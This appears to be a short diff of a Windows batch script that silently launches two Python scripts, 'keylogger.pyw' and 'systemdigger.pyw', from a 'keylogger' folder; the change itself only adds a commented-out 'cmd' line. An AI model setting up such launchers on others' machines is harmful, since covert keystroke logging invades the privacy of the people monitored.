@@ -1,6 +1,7 @@
 @echo off
 
 @REm start programes
+@REM cmd "" 
 start "" "H:\keylogger\keylogger.pyw"
 start "" "H:\keylogger\systemdigger.pyw"
 
